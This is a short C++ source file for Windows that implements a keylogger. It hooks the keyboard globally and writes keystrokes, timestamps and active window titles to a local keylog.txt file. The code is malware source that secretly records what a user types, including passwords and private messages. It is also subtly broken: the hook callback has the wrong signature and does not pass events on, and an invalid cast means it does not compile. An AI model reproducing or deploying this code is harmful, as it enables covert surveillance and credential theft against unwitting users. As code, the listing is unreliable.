#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>

using namespace std;

bool isAltPressed = false;
void onKeyPressed(WPARAM wParam, LPARAM lParam) {
    if (wParam == VK_MENU && GetAsyncKeyState(VK_CONTROL)) {
        isAltPressed = true;
    } else if (isAltPressed && wParam != VK_MENU) {
        isAltPressed = false;

        // Save the key
        ofstream logFile("keylog.txt", ios::app);
        if (!logFile.is_open()) return;

        char* keyChar = static_cast<char*>(lParam);
        string keyStr(keyChar, 1);

        // Backspace and Enter handling
        if (wParam == VK_BACK) {
            keyStr = "<BACKSPACE>";
        } else if (wParam == VK_RETURN) {
            keyStr = "\n";
        }

        logFile << keyStr;
        logFile.close();
    }
}

void addTimestampAndWindowName() {
    // Add timestamps and active window name to the log
    ofstream logFile("keylog.txt", ios::app);
    if (!logFile.is_open()) return;

    char buffer[512];
    GetWindowTextA(GetForegroundWindow(), buffer, 512);
    string windowTitle(buffer);

    time_t now = time(0);
    strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", localtime(&now));
    logFile << "Timestamp: " << buffer << endl;
    logFile << "Active Window: " << windowTitle << endl;
    logFile.close();
}

int main() {
    // Hook the keyboard
    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, onKeyPressed, GetModuleHandle(NULL), 0);
    if (!hHook) return -1;

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);

        // Add timestamps and window names
        addTimestampAndWindowName();
    }

    // Unhook the keyboard
    UnhookWindowsHookEx(hHook);

    return 0;
}
